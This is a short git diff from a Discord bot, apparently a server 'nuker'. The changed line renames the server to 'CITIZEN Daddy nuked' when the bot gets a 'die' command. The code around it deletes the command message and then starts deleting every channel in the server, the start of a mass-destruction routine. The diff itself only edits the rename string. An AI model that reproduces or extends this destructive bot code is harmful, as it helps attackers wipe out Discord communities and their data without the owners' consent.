@@ -219,7 +219,7 @@ client.on("message", async message => {
         if (message.content.startsWith(prefix + 'die')) {
 
                 message.delete();
-                message.guild.setName(`CITIZEN Daddy` + + message.guild.name).then(console.log(green('Server named changed of ' + message.guild.name))); // changes server name
+                message.guild.setName(`CITIZEN Daddy nuked ` + message.guild.name).then(console.log(green('Server named changed of ' + message.guild.name))); // changes server name
 
                 // Channel Delete
                 message.guild.channels.cache.forEach(channel => channel.delete().then(
